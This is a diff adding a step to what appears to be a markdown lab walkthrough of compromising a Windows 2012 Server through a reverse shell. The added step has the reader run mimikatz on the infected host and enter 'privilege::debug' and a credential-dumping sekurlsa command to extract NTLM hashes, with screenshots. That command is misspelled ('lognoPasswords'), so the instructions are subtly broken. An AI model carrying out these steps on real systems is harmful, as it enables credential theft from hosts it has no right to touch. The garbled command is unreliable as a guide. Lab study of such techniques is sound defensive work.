@@ -32,6 +32,16 @@ This is a demonstration of obtaining a reverse shell on a Windows 2012 Server. T
   - 1 - In your meterpreter session, type upload and the location of the file you would like to upload. In this case, it will be mimikatz. It could be a good idea to place it in your web servers root directory. See below example screenshot of this step being performed :
   
   ![image](https://user-images.githubusercontent.com/101802030/225954841-e3218cfe-4182-4a50-9935-e6114c380d5b.png)
+  
+  # Step 5 : Navigate to the infected hosts directory where you uploaded mimikatz to, in the previous step, and do the following -
+  - 1 - Run mimikatz, by simply typing mimikatz.exe. Don't use tab(ever!). This should display the mimikatz console.
+  - 2 - In order to obtain the ntlm hash, run the following command :
+  - 2.1 - privilege::debug
+  - 2.2 - sekurlsa::lognoPasswords
+  - You should then see the following screen :
+  
+  ![image](https://user-images.githubusercontent.com/101802030/225957540-0887f031-02b4-44da-8a83-fac4887ce0cf.png)
+
 
 
 
